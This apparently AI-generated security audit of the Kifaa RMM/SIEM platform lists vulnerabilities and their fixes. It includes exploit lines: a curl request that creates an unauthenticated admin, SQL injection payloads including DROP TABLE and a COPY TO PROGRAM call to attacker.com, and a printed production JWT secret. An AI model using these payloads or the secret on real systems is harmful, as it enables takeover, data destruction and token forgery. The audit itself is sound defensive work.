# KIFAA SECURITY AUDIT REPORT
**Date:** 2026-06-19  
**Platform:** Kifaa RMM/SIEM — FastAPI + React + TimescaleDB + Guacamole  
**Auditor:** Claude Code (automated static analysis)

---

## EXECUTIVE SUMMARY

The platform has **4 CRITICAL**, **7 HIGH**, **7 MEDIUM**, and **3 LOW** severity vulnerabilities.
The most dangerous issue is an unauthenticated endpoint that allows any attacker to create admin
accounts without credentials. Several agent-facing endpoints are also publicly accessible without
authentication, exposing full infrastructure topology.

---

## CRITICAL VULNERABILITIES

### C1 — Unauthenticated Admin User Creation
**File:** `server/api/routers/auth.py` — `POST /api/v1/auth/users`  
**CVSS:** 9.8

The user creation endpoint has no authentication dependency. Anyone can POST to it and
create an account with `role: "admin"`, gaining full platform control.

```python
# VULNERABLE — no auth dependency
@router.post("/users")
async def create_user(body: UserCreate, db=Depends(get_db)):
    user = User(role=body.role)   # client controls the role field
```

**Exploit:** `curl -X POST /api/v1/auth/users -d '{"username":"hacker","password":"pass","role":"admin","email":"x@x.com","full_name":"x"}'`

**Impact:** Full admin takeover, access to all agents, credentials, and ability to deploy
commands to managed machines.

**Fix:**
```python
@router.post("/users")
async def create_user(body: UserCreate, db=Depends(get_db), _=Depends(require_admin)):
    # also strip role from body — only admin can elevate to admin
    if body.role == "admin" and current_user.role != "admin":
        raise HTTPException(403, "Cannot assign admin role")
```

---

### C2 — SQL Injection in Agent Heartbeat (Metrics)
**File:** `server/api/routers/agents.py` ~line 140  
**CVSS:** 9.9

Metric names and tag JSON are concatenated directly into SQL using f-strings.
A compromised agent can execute arbitrary SQL statements.

```python
# VULNERABLE
metric_rows.append(
    f"('{ts}', '{agent.id}', '{m.name}', {m.value}, '{tags_json}'::jsonb)"
)
await db.execute(text(f"INSERT INTO metrics ... VALUES {','.join(metric_rows)}"))
```

**Exploit:** Agent sends `m.name = "x'); DROP TABLE agents; --"` or uses
`COPY agents TO PROGRAM 'curl attacker.com'` for remote code execution.

**Fix:** Use parameterized bulk insert:
```python
await db.execute(
    text("INSERT INTO metrics (time, agent_id, metric_name, value, tags) VALUES (:t,:a,:n,:v,:g)"),
    [{"t": ts, "a": str(agent.id), "n": m.name, "v": m.value, "g": json.dumps(m.tags or {})} for m in body.metrics]
)
```

---

### C3 — SQL Injection in Software Inventory
**File:** `server/api/routers/agents.py` ~line 243  
**CVSS:** 9.9

```python
# VULNERABLE
await db.execute(text(f"DELETE FROM software_inventory WHERE agent_id = '{agent.id}'"))
```

**Fix:**
```python
await db.execute(text("DELETE FROM software_inventory WHERE agent_id = :id"), {"id": str(agent.id)})
```

---

### C4 — Production Secrets Exposed in Plaintext .env
**File:** `/opt/kifaa/.env`  
**CVSS:** 9.1

All production secrets are stored in a plaintext file readable by anyone with server access:

| Secret | Risk |
|--------|------|
| `API_SECRET_KEY=KifaaAPISecret@2026!ChangeInProd` | Weak entropy, anyone can forge JWTs |
| `AGENT_REGISTRATION_SECRET` | Attacker can register fake agents |
| `TELEGRAM_TOKEN` | Active bot can be hijacked |
| `POSTGRES_PASSWORD` | Full database access |
| `BOT_SECRET` | Messaging bot compromise |

**Fix:**
1. Rotate ALL secrets immediately after reading this report
2. Generate a strong API key: `openssl rand -hex 64`
3. Use Docker secrets or environment injection — never commit `.env` to git
4. Add `.env` to `.gitignore` and audit git history for leaks

---

## HIGH VULNERABILITIES

### H1 — Agent API Endpoints Fully Public (No Authentication)
**File:** `server/api/routers/agents.py`  
**CVSS:** 7.5

The following endpoints return sensitive infrastructure data with no login required:

| Endpoint | Data Exposed |
|----------|-------------|
| `GET /api/v1/agents` | All agent hostnames, IP addresses, OS versions |
| `GET /api/v1/agents/{id}` | Full hardware specs, agent version, last seen |
| `GET /api/v1/agents/{id}/services` | Running services (reveals attack surface) |
| `GET /api/v1/agents/{id}/software` | All installed software and versions |
| `GET /api/v1/agents/{id}/metrics` | CPU, RAM, disk usage data |
| `GET /api/v1/agents/stats/dashboard` | Global infrastructure statistics |

**Impact:** Full infrastructure reconnaissance without credentials. Attacker maps the network,
identifies exploitable software versions, and finds high-value targets.

**Fix:** Add `_=Depends(get_current_user)` to every read endpoint in agents.py.

---

### H2 — No Object-Level Authorization (Broken Access Control)
**File:** All routers  
**CVSS:** 7.2

Endpoints verify a user is logged in but never check whether the user has rights to the
specific agent/resource being accessed. Any authenticated user (even `viewer` role) can:
- Read SSH credentials for any agent
- Send commands to any agent
- Access any agent's terminal
- View all monitoring data

**Fix:** Add ownership/role checks after the auth dependency:
```python
if current_user.role not in ("admin", "operator"):
    raise HTTPException(403, "Insufficient permissions")
# For agent-specific endpoints, verify the agent is in the user's assigned group
```

---

### H3 — Overly Permissive CORS
**File:** `server/api/main.py`  
**CVSS:** 6.5

```python
# VULNERABLE
CORSMiddleware(
    allow_origins=["*"],       # any website
    allow_credentials=True,    # with credentials
    allow_methods=["*"],
    allow_headers=["*"],
)
```

Any malicious website visited by a logged-in user can make authenticated API requests
(cross-site request forgery).

**Fix:**
```python
CORSMiddleware(
    allow_origins=["https://kifaa.kenyanut.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "PATCH"],
    allow_headers=["Authorization", "Content-Type"],
)
```

---

### H4 — Weak JWT Secret and Long Token Lifetime
**File:** `.env`, `server/api/config.py`  
**CVSS:** 6.8

- `API_SECRET_KEY` is ~28 characters with a predictable structure — susceptible to offline brute-force
- `ACCESS_TOKEN_EXPIRE_MINUTES=1440` (24 hours) — stolen tokens remain valid all day
- No token revocation mechanism — logout does not invalidate the token

**Fix:**
```bash
# Generate strong key
openssl rand -hex 64
```
Set `ACCESS_TOKEN_EXPIRE_MINUTES=60`. Implement a Redis-based token blacklist for logout/revocation.

---

### H5 — WebSocket Tokens Exposed in URLs
**File:** `server/api/routers/terminal.py`  
**CVSS:** 7.2

```python
# Token passed as query param — appears in nginx logs, browser history, referer headers
token: str = Query(...)
# URL: /api/v1/terminal/ssh/abc?token=eyJhbGciOiJIUzI1NiIs...
```

Nginx access logs capture the full URL including the token on every request.

**Fix:** Issue a short-lived (30-second) one-time ticket for WebSocket upgrades:
```python
# GET /api/v1/terminal/ticket  (authenticated) → returns single-use UUID stored in Redis with 30s TTL
# WebSocket connects with ?ticket=<uuid>  — server exchanges for user identity
```

---

### H6 — SSH Host Key Verification Disabled
**File:** `server/api/routers/terminal.py` ~line 77  
**CVSS:** 6.5

```python
connect_kwargs = {
    "known_hosts": None,   # ← disables all host key verification
}
```

A network-level attacker can intercept SSH sessions (man-in-the-middle), capture
credentials, and inject commands transparently.

**Fix:** Store the host key fingerprint on first connection and verify on subsequent ones.
Use `paramiko`'s `RejectPolicy` with a DB-backed known-hosts store.

---

### H7 — Phishing Module Has No Access Controls or Data Protection
**File:** `server/api/routers/phishing.py`  
**CVSS:** 7.8

- Any authenticated user (including `viewer` role) can send phishing emails
- Captured credentials from phishing targets are likely stored in plaintext
- No approval workflow — campaigns can target anyone, including external parties
- Sender address (`from_addr`) is fully user-controlled — can spoof any organization

**Fix:**
- Restrict campaign creation/sending to `admin` role only
- Add a mandatory approval step before campaign emails are sent
- Encrypt captured credentials at rest
- Add target-list validation (internal domains only, or explicit allowlist)

---

## MEDIUM VULNERABILITIES

### M1 — No Rate Limiting (Brute-Force Login Possible)
**File:** All routers  
No rate limiting exists on login, registration, or any API endpoint. An attacker can
send unlimited password guesses or flood endpoints.

**Fix:** Add `slowapi` middleware with limits on `/auth/login` (5 req/min per IP)
and agent registration (10 req/hour per IP). Consider fail2ban at nginx level.

---

### M2 — SSH/RDP Credentials Stored Unencrypted in Database
**File:** `server/api/routers/terminal.py`, DB table `agent_ssh_credentials`  
Passwords and SSH private keys are stored in plaintext in the database. A database
dump or SQL injection exposes all managed machine credentials immediately.

**Fix:** Encrypt sensitive fields using Fernet symmetric encryption:
```python
from cryptography.fernet import Fernet
# Encrypt on write, decrypt on read — store FERNET_KEY in secrets manager
```

---

### M3 — HTTPS Not Enforced (HTTP Allowed)
**File:** `nginx/conf.d/kifaa.conf`  
HTTP on port 80 is active. All traffic (tokens, passwords, RDP session data) can be
intercepted in plaintext on the network.

**Fix:**
```nginx
server {
    listen 80;
    return 301 https://$host$request_uri;  # force HTTPS
}
server {
    listen 443 ssl;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
}
```

---

### M4 — Syslog UDP Port Exposed Without Authentication
**File:** `docker-compose.yml` line 69  
```yaml
ports:
  - "514:5140/udp"   # ← bound to all interfaces
```
Any host (or internet if firewall allows) can send arbitrary syslog messages, flooding
logs, injecting false events, or triggering DoS.

**Fix:** Bind to loopback only — `127.0.0.1:514:5140/udp`. Accept syslog only from
known agent IPs, validate source IP in the syslog handler.

---

### M5 — Agent Download Directory Lists All Files (autoindex on)
**File:** `nginx/conf.d/kifaa.conf`  
```nginx
location /downloads/ {
    autoindex on;   # ← attacker can enumerate all agent builds
}
```
Attacker can enumerate all deployed agent versions and download them to reverse-engineer.

**Fix:** Set `autoindex off;`

---

### M6 — Audit Logs in Same Database (Can Be Wiped by Attacker)
**File:** `server/api/routers/` — `AuditLog` model  
Audit logs are stored in the same PostgreSQL database. An attacker who achieves SQL
injection or DB access can delete all evidence of their activity.

**Fix:** Forward audit logs to an external, append-only syslog server (syslog-ng, Graylog,
or cloud logging). The DB copy is fine for UI queries but must not be the only copy.

---

### M7 — RDP Certificate Validation Disabled
**File:** `server/api/routers/terminal.py`  
```python
params.update({
    "ignore-cert": "true",
    "security": "any",   # accepts weak/no encryption
})
```
RDP sessions can be intercepted. A rogue machine can impersonate any Windows host.

**Fix:** Default to `security: tls` and `ignore-cert: false`. Add a UI toggle to
override per-agent with an explicit warning.

---

## LOW VULNERABILITIES

### L1 — Weak Password Policy
**File:** `server/api/routers/auth.py`  
Minimum password length is 8 characters with no complexity requirements.

**Fix:** Enforce minimum 12 characters, at least one uppercase, one number, one special character.

---

### L2 — Missing Security Headers
**File:** `nginx/nginx.conf`  
Present: `X-Frame-Options`, `X-Content-Type-Options`, `X-XSS-Protection`  
Missing:
- `Strict-Transport-Security` (HSTS)
- `Content-Security-Policy`
- `Referrer-Policy`
- `Permissions-Policy`

**Fix:** Add to nginx:
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

---

### L3 — Default Admin Password Seeded in init.sql
**File:** `server/sql/init.sql`  
The database init script seeds a default admin account with a known bcrypt hash.
If the `ON CONFLICT DO NOTHING` clause fails (e.g., table recreated), the known
password is restored.

**Fix:** Remove the password from init.sql. Force password setup on first login via
a `password_must_change` flag. Generate a random temp password printed to container
startup logs instead.

---

## VULNERABILITY SUMMARY

| ID | Severity | Issue | Exploitability |
|----|----------|-------|----------------|
| C1 | CRITICAL | Unauthenticated admin user creation | Trivial — single curl command |
| C2 | CRITICAL | SQL injection in metrics heartbeat | Requires compromised agent |
| C3 | CRITICAL | SQL injection in software inventory | Requires compromised agent |
| C4 | CRITICAL | Plaintext secrets in .env | Requires server file access |
| H1 | HIGH | Agent endpoints public (no auth) | Trivial — no credentials needed |
| H2 | HIGH | No object-level authorization | Requires any valid login |
| H3 | HIGH | CORS allows all origins | Requires victim to visit malicious site |
| H4 | HIGH | Weak JWT secret, 24h token lifetime | Medium — offline brute force |
| H5 | HIGH | WebSocket tokens in URL (logged) | Requires log file access |
| H6 | HIGH | SSH host key verification disabled | Requires network position (MITM) |
| H7 | HIGH | Phishing module no access controls | Requires any valid login |
| M1 | MEDIUM | No rate limiting on any endpoint | Low effort — automated tools |
| M2 | MEDIUM | Credentials stored unencrypted in DB | Requires DB access |
| M3 | MEDIUM | HTTP allowed, no HTTPS enforcement | Requires network position |
| M4 | MEDIUM | Syslog UDP open without auth | Requires network access |
| M5 | MEDIUM | Download directory autoindex on | Trivial — browser access |
| M6 | MEDIUM | Audit logs only in same DB | Requires DB/SQL access |
| M7 | MEDIUM | RDP cert validation disabled | Requires network position |
| L1 | LOW | Weak password policy (8 chars min) | Low |
| L2 | LOW | Missing HSTS and CSP headers | Low |
| L3 | LOW | Default admin hash in init.sql | Low — edge case |

---

## REMEDIATION TASKS

See `AUDIT_TASKS.md` for the actionable task list.
